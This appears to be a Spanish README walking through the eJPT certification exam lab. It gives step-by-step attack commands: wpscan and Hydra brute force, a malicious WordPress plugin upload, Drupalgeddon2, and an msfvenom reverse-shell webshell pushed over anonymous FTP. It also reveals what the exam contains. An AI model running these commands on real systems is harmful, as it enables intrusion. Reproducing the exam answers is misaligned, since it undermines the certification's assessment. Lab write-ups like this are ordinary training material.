# Easy-JTP
Suerte con la certificación, no recomiendo usar Metasploit si son nuevos.. mejor entiendan las vulnerabilidades
---

## **Tabla de Contenidos**
1. [Enumeración Inicial](#enumeración-inicial)
2. [Explotación de WordPress](#explotación-de-wordpress)
3. [Fuerza Bruta a XRDP](#fuerza-bruta-a-xrdp)
4. [Fuerza Bruta a SMB](#fuerza-bruta-a-smb)
5. [Explotación de Drupal](#explotación-de-drupal)
6. [Explotación de FTP](#explotación-de-ftp)
7. [Recomendaciones Generales](#recomendaciones-generales)

---

## **Enumeración Inicial**

El primer paso en cualquier examen o actividad de pentesting es la **enumeración o reconocimiento**. Utilicé `nmap` para escanear la red completa y descubrir servicios abiertos:

1. **Comando utilizado**: Realicé un escaneo con los scripts comunes y la detección de versiones para identificar los servicios disponibles "nmap -sC -sV -v 192.168.100.0/24".

2. **Resultados**:
   - 4 máquinas con servicios HTTP (puerto 80).
   - 2 máquinas con bases de datos MySQL.
   - 2 máquinas con XRDP (protocolo RDP).
   - Otros servicios como FTP y SMB en diferentes hosts.

3. **Hostname importante**: Encontré que uno de los servicios en `192.168.100.50` requería agregar el dominio `wordpress.local` en el archivo `/etc/hosts` para acceder al sitio web.

---

## **Explotación de WordPress**

1. **Enumeración de WordPress**:
   - Utilicé `wpscan` para enumerar usuarios y plugins.
   - Los usuarios y plugins detectados fueron claves para planear un ataque de fuerza bruta.
   - comandos: wpscan --url http://wordpress.local/ -e u; wpscan --url http://wordpress.local/ -e p;

2. **Fuerza Bruta de Contraseñas**:
   - Probé credenciales utilizando una lista de contraseñas conocida (`rockyou.txt`).
   - Después de descomprimir la lista de contraseñas (`gzip -d /usr/share/wordlists/rockyou.txt.gz`), ejecuté el ataque y logré obtener acceso.
   - comando con wpscan: wpscan --url http://wordpress.local/ --passwords /usr/share/wordlists/rockyou.txt

3. **Escalación a Shell**:
   - Subí un plugin malicioso manualmente para obtener una **reverse shell** manualmente.
   - Alternativamente, pueden usar el módulo `wp_admin_shell_upload` de Metasploit para automatizar este paso. Es importante activar el plugin desde el panel de WordPress si no funciona inmediatamente modificar el shell porque lo agregar para linux y la maquina es windows.

---

## **Fuerza Bruta a XRDP**

Hay dos máquinas con XRDP habilitado. Para realizar un ataque de fuerza bruta:

1. **Preparación de usuarios y contraseñas**:
   - Creé una lista de posibles usuarios basada en la información obtenida durante la enumeración.

2. **Ataque de fuerza bruta**:
   - Realicé fuerza bruta utilizando Hydra. Una vez encontradas las credenciales, accedí al escritorio remoto con `xfreerdp`.

3. **Escenario clave**:
   - Una de las máquinas permitía acceso como **root** mediante XRDP, lo que simplificó el control total del sistema.

4. **comandos**
   Fuerza bruta:

   hydra -L usuarios.txt -P  /usr/share/wordlists/rockyou.txt -t 4 -V rdp://192.168.100.52

   Para acceder:
   xfreerdp /u:el usuario /p:la password /v:192.168.100.52

---

## **Fuerza Bruta a SMB**

1. **Enumeración de Recursos Compartidos**:
   - Enumeré recursos SMB utilizando herramientas como `smbclient` y `enum4linux`.

2. **Fuerza Bruta de Credenciales**:
   - Utilicé Hydra para realizar ataques de fuerza bruta en el servicio SMB. Con las credenciales obtenidas, accedí a los recursos compartidos y extraje información relevante.

3. **comandos**:

hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt smb://<IP_del_objetivo>
---

## **Explotación de Drupal**

1. **Identificación de la versión**:
   - Detecté que uno de los servidores estaba ejecutando una versión vulnerable de Drupal (CVE-2018-7600).

2. **Uso de Metasploit**:
   - existe el módulo `drupal_drupalgeddon2` para intentar obtener una shell.
   - Si el exploit no devuelve una shell estable, consideren usar técnicas como port forwarding o proxies para mejorar la conectividad.
    -al final al conectarte por xrdp eres root entonces no hay que hacer escalacion
---

## **Explotación de FTP**

1. **Subida de Webshell**:
   - accedan al servidor FTP donde subí una **webshell** (`shell.aspx`), debemos tener encuenta que existe un webshell, pero con anonymous pueden subir el archivo asi que mejor una revershell... lo consultan en la web http://192.168.100.51/shell.aspx no olvides escuchar con netcat....
   - si no te deja copiar o algun error X: usa msfvenom.... msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=192.168.100.5 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx; y escuchas por el multi/handler

2. **Ejecución de la Webshell**:
   - configuren un listener (`nc`) para recibir la conexión y ejecuté la shell accediendo a su ruta desde el navegador "nc -lnvp (#)".

3. **Resultado**:
   - Obtención de acceso al sistema mediante una **reverse shell**.

---

## **Recomendaciones Generales**

1. **Enumeración exhaustiva**: Herramientas como `nmap`, `wpscan` y `enum4linux` son clave para identificar puntos de entrada.
2. **Uso de Hydra**: Es una herramienta poderosa para fuerza bruta en servicios como XRDP, SMB y FTP.
3. **Documentar todo**: Anoten usuarios, contraseñas y comandos utilizados para facilitar la resolución de preguntas del examen y hagan sus diccionarios propios.
4. **Prueben manualmente**: Aunque Metasploit es útil, es importante entender los procesos manuales detrás de los exploits.
5. **Existe una pregunta de usuarios como contraseña de alguno y si existen**: si es por xrdp, revisen remote desktop y enumeren manualmente... primero validar que existan con net user. 

## **Maquinas de HTB para practicar**

HTB - armagedon-

HTB - Blocky-

HTB -Devel-

HTB -Explosion-


---

SUERTE! 

![image](https://github.com/user-attachments/assets/2d5674de-bb61-4afe-a0ce-c4d95e982af0)
